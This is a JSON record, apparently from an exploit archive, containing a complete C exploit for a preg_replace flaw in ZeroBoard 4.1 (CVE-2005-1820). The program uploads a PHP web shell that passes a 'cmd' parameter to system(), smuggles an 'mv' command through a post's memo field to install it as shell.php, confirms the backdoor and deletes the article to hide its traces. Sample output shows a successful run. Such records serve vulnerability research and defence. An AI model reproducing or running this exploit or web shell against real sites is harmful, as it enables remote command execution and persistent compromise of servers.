{
  "id": "1020",
  "title": "ZeroBoard 4.1 - &#039;preg_replace&#039; Remote Nobody Shell",
  "cve": "CVE-2005-1820",
  "vuln_type": "unknown",
  "code": "/*\r\n*\r\n----------------------------------------------------------------------------------\r\n[+] Zeroboard preg_replace vulnerability Remote nobody shell exploit \r\n----------------------------------------------------------------------------------\r\n\r\n> by n0gada (n0gada@null2root.org)\r\n\r\n[*] date : 2005/5/29\r\n\r\n[*] the bug\r\n\r\nOriginal advisory: \r\n- http://pandora.sapzil.info/text/notify/20050123.zb41advisory.php\r\n\r\nApplication\r\n- Zeroboard 4.1 pl2 - 4.1 pl5\r\n\r\nReference:\r\n- http://www.nzeo.com\r\n\r\n[*] Target - My test server\r\n\r\n$ ./zbexpl http://xxx.xxx.xxx/zboard/zboard.php?id=test\r\n- Target : http://xxx.xxx.xxx/zboard/zboard.php?id=test\r\n\r\n[+] xxx.xxx.xxx connecting ok!\r\n[+] Zeroboard writing . ok!\r\n[+] Confirmming your article - found!\r\n[+] Exploiting zeroboard start ............................... Done!\r\n[*] Confirmming your backdoor php script - \r\nhttp://xxx.xxx.xxx/zboard/data/test/shell.php is generated!\r\n[+] Exploiting success!!\r\n[*] Remove your article - ok! :)\r\n\r\n------------------------------------------------------------------------------\r\n*\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <stdarg.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <netdb.h>\r\n#include <sys/types.h>\r\n#include <signal.h>\r\n#include <time.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <sys/select.h>\r\n#include <errno.h>\r\n\r\n\r\n#define BUFSIZE 4096\r\n#define READSIZE 1500\r\n\r\nvoid ParseZbHost(char *);\r\nvoid ConnectZboard(char *, unsigned short);\r\nvoid WriteZboard(void);\r\nvoid ExploitZboard(void);\r\nvoid ConfirmPHPScript(void);\r\nvoid DeleteArticle(void);\r\nvoid StatusProcess(void);\r\nvoid Usage(char *);\r\nvoid OutputErr(char *, int);\r\n\r\nchar *zb_host;\r\nchar *zb_dir;\r\nchar *zb_tid;\r\nunsigned short zb_port;\r\n\r\nint sockfd = -1;\r\nint reconn=0;\r\nchar ReadBuf[READSIZE];\r\nchar WriteBuf[BUFSIZE];\r\nchar TempBuf[BUFSIZ];\r\nchar no[16];\r\n\r\n\r\nint main(int argc, char *argv[]){\r\n\r\nif(argc < 2) Usage(argv[0]);\r\n\r\nif(argc > 2) zb_port = atoi(argv[2]); \r\nelse zb_port = 80;\r\n\r\n// http://host/bbs/zboard.php?id=test \r\n\r\nParseZbHost(argv[1]);\r\n\r\nConnectZboard(zb_host, zb_port);\r\n\r\nWriteZboard();\r\n\r\nExploitZboard();\r\n\r\nConfirmPHPScript();\r\n\r\nDeleteArticle();\r\n}\r\n\r\nvoid ParseZbHost(char *zbhost)\r\n{\r\nchar *psbuf;\r\nchar *sptr=NULL;\r\nchar *eptr=NULL;\r\n\r\npsbuf = malloc(strlen(zbhost)+1);\r\n\r\nstrcpy(psbuf, zbhost);\r\n\r\nif((sptr = strstr(psbuf,\"http://\")) == NULL) OutputErr(\"http://host need\\n\", 0);\r\n\r\nzb_host = sptr+7;\r\n\r\nsptr = strchr(zb_host, '/');\r\nsptr[0] = '\\0';\r\nsptr++;\r\n\r\nif((eptr = strstr(sptr, \"zboard.php?id=\")) == NULL) OutputErr(\"\\\"zboard.php?id=\\\" \r\nneed\\n\", 0);\r\n\r\nzb_tid = eptr+14;\r\n\r\neptr--;\r\neptr[0] = '\\0';\r\n\r\nzb_dir = sptr;\r\n\r\nfprintf(stdout, \" - Target : http://%s/%s/zboard.php?id=%s\\n\", zb_host, zb_dir, \r\nzb_tid);\r\nfflush(stdout); \r\n}\r\n\r\n\r\nvoid ConnectZboard(char *server, unsigned short port)\r\n{\r\n\r\nstruct sockaddr_in serv; \r\nstruct hostent *hostname;\r\n\r\nif(!(hostname = gethostbyname(server))) OutputErr(server, 1);\r\nif((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) OutputErr(\"socket\", 1);\r\n\r\nmemset(&serv, 0, sizeof(serv));\r\nserv.sin_family = AF_INET;\r\nserv.sin_port = htons(port);\r\nserv.sin_addr.s_addr = *((unsigned long *)hostname->h_addr_list[0]);\r\n// serv.sin_addr = *((struct in_addr *)hostname->h_addr_list[0]);\r\n\r\nif(connect(sockfd, (struct sockaddr *)&serv, sizeof(struct sockaddr)) < 0)\r\nOutputErr(\"connect\", 1);\r\n\r\nif(!reconn) fprintf(stdout,\"\\n [+] %s connecting ok!\\n\", server);\r\nelse if(reconn == 1) fprintf(stdout, \" [+] %s reconnecting ok!\\n\", server);\r\nfflush(stdout);\r\n\r\nreconn = 0;\r\n}\r\n\r\nvoid WriteZboard(void)\r\n{\r\nfd_set fds;\r\nstruct timeval tv;\r\nint err = -1;\r\nint i = 0;\r\nint cnt=0;\r\nchar *tmp_ptr, *ptr;\r\nchar form_data[BUFSIZE];\r\n\r\nmemset(form_data, 0, sizeof(form_data));\r\nsprintf(form_data,\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"page\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"1\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"id\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"%s\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"no\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"select_arrange\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"headnum\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"desc\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"asc\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"page_num\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"keyword\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"category\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"sn\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"off\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"ss\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"on\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"sc\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"on\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"mode\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"write\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"password\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"1212\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"name\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"zero\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"email\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"zero@nzeo.com\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"homepage\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"subject\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"zero@nzeo.com hi~!\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"memo\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"`mv data/%s/d214924151d9e1ffac5bb2258561031e \r\ndata/%s/shell.php`;# 70ab423bfaea846c9db0b96126254103\\r\\n\"\r\n//\"-----------------------------8ac34985126d8\\r\\n\"\r\n//\"Content-Disposition: form-data; name=\\\"sitelink1\\\"\\r\\n\"\r\n//\"\\r\\n\"\r\n//\"\\r\\n\"\r\n//\"-----------------------------8ac34985126d8\\r\\n\"\r\n//\"Content-Disposition: form-data; name=\\\"sitelink2\\\"\\r\\n\"\r\n//\"\\r\\n\"\r\n//\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"file1\\\"; \r\nfilename=\\\"d214924151d9e1ffac5bb2258561031e\\\"\\r\\n\"\r\n\"Content-Type: text/plain\\r\\n\"\r\n\"\\r\\n\"\r\n\"<?\r\nif(count($_GET)) extract($_GET);\r\nif(count($_POST)) extract($_POST);\r\nif(count($_SERVER)) extract($_SERVER);\r\necho \\\"<form action=$PHP_SELF method=post>\r\ncommand : <input type=text name=cmd>\r\n<input type=submit></form><hr>\\\";\r\nif($cmd){\r\n$cmd = str_replace(\\\"\\\\\\\\\\\", \\\"\\\", $cmd);\r\necho \\\"<pre>\\\"; system($cmd); echo \\\"</pre>\\\";\r\n}\r\n?>\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"file2\\\"; filename=\\\"\\\"\\r\\n\"\r\n\"Content-Type: application/octet-stream\\r\\n\"\r\n\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"x\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"36\\r\\n\"\r\n\"-----------------------------8ac34985126d8\\r\\n\"\r\n\"Content-Disposition: form-data; name=\\\"y\\\"\\r\\n\"\r\n\"\\r\\n\"\r\n\"11\\r\\n\"\r\n\"-----------------------------8ac34985126d8--\\r\\n\"\r\n, zb_tid, zb_tid, zb_tid);\r\n\r\n\r\n\r\nmemset(WriteBuf, 0, sizeof(WriteBuf));\r\n\r\nsprintf(WriteBuf,\r\n\"POST /%s/write_ok.php HTTP/1.1\\r\\n\"\r\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, \r\napplication/x-shockwave-flash, application/vnd.ms-excel, \r\napplication/vnd.ms-powerpoint, application/msword, */*\\r\\n\" \r\n\"Referer: http://%s/%s/write.php?id=%s&page=1&sn1=&divpage=1&\r\nsn=off&ss=on&sc=on&select_arrange=headnum&desc=asc&no=&\r\nmode=write&sn1=&divpage=1\\r\\n\"\r\n\"Content-Type: multipart/form-data; boundary=---------------------------8ac34985126d8\\r\\n\"\r\n\"Accept-Encoding: gzip, deflate\\r\\n\"\r\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\r\n\"Host: %s\\r\\n\"\r\n\"Content-Length: %d\\r\\n\"\r\n\"Connection: Keep-Alive\\r\\n\"\r\n\"Cache-Control: no-cache\\r\\n\" \r\n\"\\r\\n\"\"%s\", zb_dir, zb_host, zb_dir, zb_tid, zb_host, strlen(form_data), form_data);\r\n\r\nfprintf(stdout, \" [+] Zeroboard writing \");\r\nfflush(stdout);\r\n\r\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\r\n\r\ntv.tv_sec = 60;\r\ntv.tv_usec = 0;\r\n\r\nFD_ZERO(&fds);\r\n\r\nfor(;;){\r\n\r\nmemset(ReadBuf, 0, sizeof(ReadBuf));\r\n\r\nif(i!=0xb33f) StatusProcess();\r\n\r\nFD_SET(sockfd, &fds);\r\n\r\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\r\nif(FD_ISSET(sockfd, &fds)){\r\n\r\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\r\n\r\n\r\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\r\nif(strstr(ReadBuf+17, \"Connection: close\\r\\n\")) reconn = 1;\r\n\r\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) { \r\nerr++;\r\n}\r\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\r\nOutputErr(\" failed!(page not found)\\n\", 0);\r\n}\r\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\r\nOutputErr(\" failed!(Bad Request)\\n\", 0);\r\n}\r\nelse {\r\nOutputErr(ReadBuf, 0);\r\n}\r\n\r\n}\r\n\r\nif(err == 0){\r\n\r\nif(strstr(ReadBuf,\"<meta http-equiv=\\\"refresh\\\" content=\\\"0; url=zboard.php?id=\"))\r\n{\r\nfprintf(stdout, \" ok!\\n\");\r\nfflush(stdout);\r\n\r\nfprintf(stdout,\" [+] Confirmming your article\");\r\nfflush(stdout);\r\n\r\nif(tmp_ptr = strstr(ReadBuf+18, \"url=\")) {\r\n\r\nptr = tmp_ptr+4;\r\nif(ptr != NULL){\r\nif(tmp_ptr = strchr(ptr,'\"')) tmp_ptr[0] = '\\0';\r\n}\r\n} \r\nif(ptr = strstr(ReadBuf,\"=&no=\")){\r\nptr += 5;\r\nmemset(no, 0, sizeof(no));\r\nfor(i=0; i<16; i++){\r\nif(ptr[i] == '&') break;\r\nno[i] = ptr[i];\r\n}\r\n}\r\nif(strlen(no) > 0){\r\nfprintf(stdout,\" - found!\\n\");\r\nfflush(stdout);\r\nreturn;\r\n}\r\nelse {\r\nOutputErr(\" - failed!(not writed!?!)\\n\", 0);\r\n}\r\n} \r\nelse {\r\nif(strstr(ReadBuf,\"Total Excuted Time :\") && strstr(ReadBuf,\"\\x30\\x0d\\x0a\\x0d\\x0a\")) break;\r\n}\r\n}\r\nelse {\r\nOutputErr(\"err number error\\n\", 0);\r\n}\r\n}\r\n}\r\n\r\nfprintf(stderr, \" error!\\n\");\r\n\r\n}\r\n\r\nvoid ExploitZboard(void)\r\n{\r\nfd_set fds;\r\nstruct timeval tv;\r\nint err = -1;\r\n\r\nif(reconn == 1) ConnectZboard(zb_host, zb_port);\r\n\r\nmemset(WriteBuf, 0, sizeof(WriteBuf));\r\n\r\nsprintf(WriteBuf, \r\n\"GET /%s/view.php?id=%s&page=1&sn1=&divpage=1&sn=off&ss=off&\r\nsc=on&keyword=70ab423bfaea846c9db0b96126254103/e\"\r\n, zb_dir, zb_tid);\r\n\r\nmemcpy(WriteBuf+strlen(WriteBuf), \"\\x25\\x30\\x30\", 3);\r\n\r\nsprintf(WriteBuf+strlen(WriteBuf),\r\n\"&select_arrange=headnum&desc=asc&no=%s HTTP/1.1\\r\\n\"\r\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash,\r\napplication/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\r\n\"Referer: http://%s/%s/zboard.php\\r\\n\"\r\n\"Accept-Encoding: gzip, deflate\\r\\n\"\r\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\r\n\"Host: %s\\r\\n\"\r\n\"Connection: Keep-Alive\\r\\n\"\r\n\"\\r\\n\", no, zb_host, zb_dir, zb_host);\r\n\r\nfprintf(stdout, \" [+] Exploiting zeroboard start \");\r\nfflush(stdout);\r\n\r\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\r\n\r\ntv.tv_sec = 60;\r\ntv.tv_usec = 0;\r\n\r\nFD_ZERO(&fds);\r\n\r\nfor(;;){\r\n\r\nStatusProcess();\r\n\r\nmemset(ReadBuf, 0, sizeof(ReadBuf));\r\n\r\nFD_SET(sockfd, &fds);\r\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\r\nif(FD_ISSET(sockfd, &fds)){\r\n\r\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\r\n\r\n\r\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\r\n\r\nif(strstr(ReadBuf,\"Connection: close\\r\\n\")) reconn = 1;\r\n\r\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) { \r\nerr++; \r\n}\r\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\r\nOutputErr(\" failed!(page not found)\\n\", 0);\r\n}\r\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\r\nOutputErr(\" failed!(Bad Request)\\n\", 0);\r\n}\r\nelse {\r\nOutputErr(ReadBuf, 0);\r\n}\r\n\r\n}\r\n\r\nif(err >= 0){\r\n\r\nif(strstr(ReadBuf,\"Total Excuted Time :\") && strstr(ReadBuf, \"\\x30\\x0d\\x0a\\x0d\\x0a\")){\r\nfprintf(stdout,\" Done!\\n\"); \r\nfflush(stdout);\r\nreturn;\r\n}\r\n\r\n}\r\n\r\n}\r\n}\r\n\r\nfprintf(stderr,\" error!\\n\"); \r\n\r\n}\r\n\r\nvoid ConfirmPHPScript(void)\r\n{\r\nfd_set fds;\r\nstruct timeval tv;\r\n\r\nif(reconn == 1) ConnectZboard(zb_host, zb_port); \r\n\r\nmemset(WriteBuf, 0, sizeof(WriteBuf));\r\nsprintf(WriteBuf,\r\n\"GET /%s/data/%s/shell.php HTTP/1.1\\r\\n\"\r\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\r\napplication/x-shockwave-flash, application/vnd.ms-excel,\r\napplication/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\r\n\"Referer: http://%s/%s/zboard.php\\r\\n\"\r\n\"Accept-Encoding: gzip, deflate\\r\\n\"\r\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\r\n\"Host: %s\\r\\n\"\r\n\"Connection: Keep-Alive\\r\\n\"\r\n\"\\r\\n\", zb_dir, zb_tid, zb_host, zb_dir, zb_host);\r\n\r\nfprintf(stdout, \" [*] Confirmming your backdoor php script\");\r\nfflush(stdout);\r\n\r\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\r\n\r\ntv.tv_sec = 60;\r\ntv.tv_usec = 0;\r\n\r\n\r\nFD_ZERO(&fds);\r\n\r\nfor(;;){\r\nmemset(ReadBuf, 0, sizeof(ReadBuf));\r\n\r\nFD_SET(sockfd, &fds);\r\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\r\nif(FD_ISSET(sockfd, &fds)){\r\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\r\n\r\n\r\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\r\nif(strstr(ReadBuf,\"Connection: close\\r\\n\")) reconn = 1;\r\n\r\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) { \r\nfprintf(stdout,\" - http://%s/%s/data/%s/shell.php is generated!\\n \r\n[+] Exploiting success!!\\n\", zb_host, zb_dir, zb_tid);\r\nfflush(stdout);\r\nreturn;\r\n}\r\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\r\nOutputErr(\" - page not found\\n - 'mv' instruction permission denied.\\n - zeroboard was patched.\\n\"\r\n\" [-] Exploit failed!\\n\", 0);\r\n}\r\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\r\nOutputErr(\" - Bad Request\\n\"\r\n\" [-] Exploit failed!\\n\", 0);\r\n}\r\nelse {\r\nOutputErr(ReadBuf, 0);\r\n}\r\n}\r\n\r\n\r\n}\r\n}\r\n\r\nfprintf(stderr,\" error!\\n\");\r\n}\r\n\r\n\r\nvoid DeleteArticle(void)\r\n{\r\nfd_set fds;\r\nstruct timeval tv;\r\nchar post_data[BUFSIZ];\r\n\r\n\r\nif(reconn == 1) ConnectZboard(zb_host, zb_port);\r\n\r\nsprintf(post_data,\r\n\"page=1&id=%s&no=%s&select_arrange=headnum&desc=asc&page_num=20&keyword=&category=&sn=off&ss=off&sc=on&mode=&c_no=&password=1212&x=20&y=9\\r\\n\", zb_tid, no);\r\n\r\nmemset(WriteBuf, 0, sizeof(WriteBuf));\r\nsprintf(WriteBuf,\r\n\"POST /%s/delete_ok.php HTTP/1.1\\r\\n\"\r\n\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\\r\\n\"\r\n\"Referer: http://%s/%s/delete.php?id=%s&page=1&sn1=&divpage=1&sn=off&ss=off&sc=on&select_arrange=headnum&desc=asc&no=%s\\r\\n\"\r\n\"Content-Type: application/x-www-form-urlencoded\\r\\n\"\r\n\"Accept-Encoding: gzip, deflate\\r\\n\"\r\n\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\\r\\n\"\r\n\"Host: %s\\r\\n\"\r\n\"Content-Length: %d\\r\\n\"\r\n\"Connection: close\\r\\n\"\r\n\"Cache-Control: no-cache\\r\\n\"\r\n\"\\r\\n\"\r\n\"%s\", zb_dir, zb_host, zb_dir, zb_tid, no, zb_host, strlen(post_data), post_data);\r\n\r\n\r\nfprintf(stdout, \" [*] Remove your article \");\r\nfflush(stdout);\r\n\r\nif(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr(\"write\", 1);\r\n\r\ntv.tv_sec = 60;\r\ntv.tv_usec = 0;\r\n\r\nFD_ZERO(&fds);\r\n\r\nfor(;;){\r\n\r\nmemset(ReadBuf, 0, sizeof(ReadBuf));\r\n\r\nFD_SET(sockfd, &fds);\r\n\r\nif(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr(\"select\", 1);\r\nif(FD_ISSET(sockfd, &fds)){\r\nif(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr(\"read\", 1);\r\n\r\nif(strstr(ReadBuf, \"HTTP/1.1 \")){\r\nif(strstr(ReadBuf+9, \"200 OK\\r\\n\")) { \r\n\r\nif(strstr(ReadBuf+17, \"<meta http-equiv=\\\"refresh\\\" content=\\\"0; url=zboard.php?id=\")) {\r\nfprintf(stdout, \" - ok! :)\\n\");\r\nfflush(stdout);\r\nreturn;\r\n}\r\nelse{ \r\nbreak;\r\n}\r\n}\r\nelse if(strstr(ReadBuf+9, \"404 Not Found\\r\\n\")){\r\nOutputErr(\" - failed!(page not found)\\n\", 0);\r\n}\r\nelse if(strstr(ReadBuf+9, \"400 Bad Request\\r\\n\")){\r\nOutputErr(\" - failed!(Bad Request)\\n\", 0);\r\n}\r\nelse {\r\nfprintf(stderr,\"%s\", ReadBuf);\r\nexit(1);\r\n}\r\n}\r\n\r\n}\r\n}\r\n\r\nfprintf(stderr,\" error!\\n\");\r\n}\r\n\r\nvoid StatusProcess(void)\r\n{\r\nputchar('.');\r\nfflush(stdout);\r\n}\r\n\r\n\r\nvoid OutputErr(char *msg, int type)\r\n{\r\nif(!type){\r\nfprintf(stderr,\"%s\", msg);\r\nfflush(stderr);\r\n}\r\nelse if(type==1){\r\nif(!strcmp(msg, zb_host)) herror(msg);\r\nelse perror(msg);\r\n}\r\n\r\nDeleteArticle();\r\nexit(1);\r\n}\r\n\r\nvoid Usage(char *arg)\r\n{ \r\nfprintf(stderr,\"[*] Zeroboard preg_replace() vulnerability Remote nobody exploit by n0gada\\n\"); \r\nfprintf(stderr,\"--------------------------------------------------------------------------\\n\");\r\nfprintf(stderr,\"Usage: %s <SERVER> [PORT - default : 80] \\n\", arg);\r\nfprintf(stderr,\"--------------------------------------------------------------------------\\n\");\r\n\r\nexit(1);\r\n}\r\n\r\n// milw0rm.com [2005-05-31]",
  "url": "https://www.exploit-db.com/exploits/1020"
}